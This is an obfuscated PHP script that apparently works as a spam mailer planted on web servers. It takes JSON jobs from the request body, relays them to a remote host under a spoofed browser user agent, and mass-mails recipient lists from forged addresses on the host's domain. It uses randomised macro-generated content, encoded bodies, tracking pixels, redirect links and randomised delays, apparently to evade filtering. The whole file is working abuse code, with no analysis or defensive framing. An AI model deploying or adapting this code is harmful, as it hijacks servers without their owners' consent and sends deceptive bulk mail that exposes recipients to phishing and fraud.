<?php
@ini_set('max_execution_time', '3600'); @ini_set('max_input_time', '3600'); @set_time_limit(3600); @date_default_timezone_set('UTC'); class Macros { private $values = array(); private $fixed = array(); private $used = array(); private $_keys = array(); public function __get($sp8300af) { if ($sp8300af == 'keys') { return array_keys($this->_keys); } } public function Import($sp8300af, $spbd57b9) { if (is_array($spbd57b9)) { $this->values[$sp8300af] = array(); foreach ($spbd57b9 as $spa02473) { if (!empty($spa02473['key'])) { $this->values[$sp8300af][$spa02473['key']] = $spa02473['value']; } else { $this->values[$sp8300af][] = $spa02473['value']; } } } else { $this->Assign($sp8300af, $spbd57b9); } } public function Assign($sp8300af, $sp9d3f16) { $this->values[$sp8300af] = $sp9d3f16; } public function Parse($spc1aa51) { $sp13d535 = ''; $sp7301d2 = 0; while (true) { $sp5abb7f = strpos($spc1aa51, '{', $sp7301d2); if ($sp5abb7f === false) { $sp13d535 .= substr($spc1aa51, $sp7301d2); break; } $sp13d535 .= substr($spc1aa51, $sp7301d2, $sp5abb7f - $sp7301d2); $sp7301d2 = $sp5abb7f + 1; $sp9bb68b = ''; $sp96bd21 = '{'; $sp1abbe3 = array(); $sp4061c3 = false; $sp30d3d6 = false; $spc6a571 = 'var'; while ($sp7301d2 < strlen($spc1aa51)) { $spa7c5a3 = substr($spc1aa51, $sp7301d2, 1); $sp96bd21 .= $spa7c5a3; if ($spa7c5a3 == ',' || $spa7c5a3 == '>' || $spa7c5a3 == '|') { if ($spc6a571 == 'alias') { $sp4061c3 = $sp9bb68b; } elseif ($spc6a571 == 'mod') { $sp30d3d6 = $sp9bb68b; } else { $sp1abbe3[] = $sp9bb68b; } $sp9bb68b = ''; if ($spa7c5a3 == '>') { $spc6a571 = 'alias'; } if ($spa7c5a3 == '|') { $spc6a571 = 'mod'; } $sp7301d2++; continue; } if ($spa7c5a3 == '}') { if ($spc6a571 == 'alias') { $sp4061c3 = $sp9bb68b; } elseif ($spc6a571 == 'mod') { $sp30d3d6 = $sp9bb68b; } else { $sp1abbe3[] = $sp9bb68b; } $sp7301d2++; break; } $sp9bb68b .= $spa7c5a3; if (preg_match('/[0-9A-Za-z_\\[\\]\\-\\^!]/', $spa7c5a3) == 0) { $sp7301d2++; $sp1abbe3 = array(); break; } $sp7301d2++; } if (sizeof($sp1abbe3) == 0) { $sp13d535 .= $sp96bd21; continue; } $spf6f315 = false; $sp3222ad = false; if (preg_match('/^\\^/', $sp1abbe3[0]) > 0) { $sp1abbe3[0] = substr($sp1abbe3[0], 1); $spf6f315 = true; } if (preg_match('/^\\!/', $sp1abbe3[0]) > 0) { $sp1abbe3[0] = substr($sp1abbe3[0], 1); $sp3222ad = true; } $sp1391ff = false; if (preg_match('/\\[([0-9A-Za-z_]+)\\]/', $sp1abbe3[0], $sp37512d) > 0) { $sp1391ff = $sp37512d[1]; } elseif (preg_match('/\\[([\\d\\-]+)\\]/', $sp1abbe3[0], $sp37512d) > 0) { $sp1391ff = explode('-', $sp37512d[1]); } if ($sp1391ff !== false) { $sp1abbe3[0] = substr($sp1abbe3[0], 0, strpos($sp1abbe3[0], '[')); } $this->_keys[$sp1abbe3[0]] = true; if (empty($this->values[$sp1abbe3[0]]) && empty($this->fixed[$sp1abbe3[0]])) { continue; } if ($spf6f315) { unset($this->fixed[$sp1abbe3[0]]); } if (isset($this->fixed[$sp1abbe3[0]])) { $spb59eac = $this->fixed[$sp1abbe3[0]]; } else { $spb59eac = ''; $sp72773d = 1; if (sizeof($sp1abbe3) == 2) { $sp72773d = $sp1abbe3[1]; } if (sizeof($sp1abbe3) == 3) { $sp72773d = rand($sp1abbe3[1], $sp1abbe3[2]); } for ($specf1e8 = 0; $specf1e8 < $sp72773d; $specf1e8++) { if (is_array($this->values[$sp1abbe3[0]])) { if (!is_array($this->used[$sp1abbe3[0]])) { $this->used[$sp1abbe3[0]] = array(); } if (count($this->used[$sp1abbe3[0]]) == count($this->values[$sp1abbe3[0]])) { $this->used[$sp1abbe3[0]] = array(); } if ($sp1391ff !== false && is_scalar($sp1391ff)) { $spb59eac .= $this->values[$sp1abbe3[0]][$sp1391ff]; $this->used[$sp1391ff] = true; } else { $spf2f569 = array(); if (is_array($sp1391ff)) { $sp6f4a0e = $sp1391ff[0]; $sp7193c8 = $sp1391ff[1]; } else { $sp6f4a0e = 0; $sp7193c8 = count($this->values[$sp1abbe3[0]]) - 1; } for ($sp819731 = $sp6f4a0e; $sp819731 <= $sp7193c8; $sp819731++) { if ($sp3222ad && !empty($this->used[$sp1abbe3[0]][$sp819731])) { continue; } $spf2f569[] = $sp819731; } $sp6659da = $spf2f569[rand(0, count($spf2f569) - 1)]; $this->used[$sp1abbe3[0]][$sp6659da] = true; $spb59eac .= $this->values[$sp1abbe3[0]][$sp6659da]; } } else { $spb59eac .= $this->values[$sp1abbe3[0]]; } } } $spb59eac = $this->Parse($spb59eac); if ($sp30d3d6 !== false) { for ($sp46c1ae = 0; $sp46c1ae < strlen($sp30d3d6); $sp46c1ae++) { switch (substr($sp30d3d6, $sp46c1ae, 1)) { case 'b': $spb59eac = base64_encode($spb59eac); break; case 'q': $spb59eac = quoted_printable_encode($spb59eac); break; default: break; } } } if ($spf6f315) { $this->fixed[$sp1abbe3[0]] = $spb59eac; } if ($sp4061c3 !== false && $sp4061c3 != '') { $this->fixed[$sp4061c3] = $spb59eac; } $sp13d535 .= $spb59eac; } return $sp13d535; } } $spc4d913 = file_get_contents('php://input'); $sp87ac84 = json_decode($spc4d913, true); if (empty($sp87ac84['via_proxy'])) { $sp87ac84['via_proxy'] = true; $sp52f426 = curl_init($sp87ac84['prefix'] . $sp87ac84['files']['s']); $sp8e1d1d = json_encode($sp87ac84); curl_setopt($sp52f426, CURLOPT_CONNECTTIMEOUT, 30); curl_setopt($sp52f426, CURLOPT_TIMEOUT, 600); curl_setopt($sp52f426, CURLOPT_RETURNTRANSFER, true); curl_setopt($sp52f426, CURLOPT_USERAGENT, 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'); curl_setopt($sp52f426, CURLOPT_REFERER, $sp0b48ea); curl_setopt($sp52f426, CURLOPT_POST, true); curl_setopt($sp52f426, CURLOPT_POSTFIELDS, $sp8e1d1d); curl_setopt($sp52f426, CURLOPT_HTTPHEADER, array('Content-Type: application/json', 'Content-Length: ' . strlen($sp8e1d1d))); $sp19b88b = curl_exec($sp52f426); echo $sp19b88b; die; } $spfedc91 = $_SERVER['SERVER_ADDR']; $sp96056f = $_SERVER['HTTP_HOST']; $sp96056f = preg_replace('/^www\\./', '', $sp96056f); $sp8f2b21 = new Macros(); $sp8f2b21->Assign('server_addr', $spfedc91); $sp8f2b21->Assign('server_host', $sp96056f); foreach ($sp87ac84['macros'] as $sp8300af => $spbd57b9) { $sp8f2b21->Import($sp8300af, $spbd57b9); } $spa12481 = preg_replace('/^www\\./i', '', $sp96056f); $sp09a054 = $sp8f2b21->Parse('{from_user}@' . $spa12481); $sp8f2b21->Assign('from_email', $sp09a054); $sp8f2b21->Assign('prefix', $sp87ac84['prefix']); $sp8f2b21->Assign('html', $sp87ac84['letter']['html']); $sp7301d2 = 0; $spede8f3 = 0; $spabe160 = 0; $spdb16c9 = array(); foreach ($sp87ac84['rcpt'] as $sp549048) { $sp8f2b21->Assign('email', $sp549048['email']); $sp8f2b21->Assign('entry', $sp549048); $sp8f2b21->Assign('date', date('r')); $sp8f2b21->Assign('redirect', $sp87ac84['prefix'] . $sp87ac84['files']['r']); $sp8f2b21->Assign('redirect_with_uri', $sp87ac84['prefix'] . $sp87ac84['files']['r'] . '?uri='); $sp8f2b21->Assign('unsubscribe', $sp87ac84['prefix'] . $sp87ac84['files']['u'] . '?id=' . $sp549048['id']); $sp8f2b21->Assign('delivery', '<img src="' . $sp87ac84['prefix'] . $sp87ac84['files']['d'] . '?id=' . $sp549048['id'] . '" />'); $sp1ea496 = $sp8f2b21->Parse($sp87ac84['envelope']['header']); $sp9478e6 = $sp8f2b21->Parse($sp87ac84['envelope']['body']); if (!empty($sp549048['name'])) { $sp88c2ce = $sp549048['name'] . ' <' . $sp549048['email'] . '>'; } else { $sp88c2ce = $sp549048['email']; } $sp6e3523 = $sp8f2b21->Parse($sp87ac84['letter']['subject']); if ($sp7301d2 > 0) { sleep(rand(3, 8)); } $spfd40ab = mail($sp88c2ce, $sp6e3523, $sp9478e6, $sp1ea496); $spdb16c9[$sp549048['id']] = $spfd40ab; if ($spfd40ab) { $spede8f3++; } else { $spabe160++; } $sp7301d2++; } echo serialize(array('total' => count($sp87ac84['rcpt']), 'sent' => $sp7301d2, 'success' => $spede8f3, 'error' => $spabe160, 'rcpt' => $spdb16c9));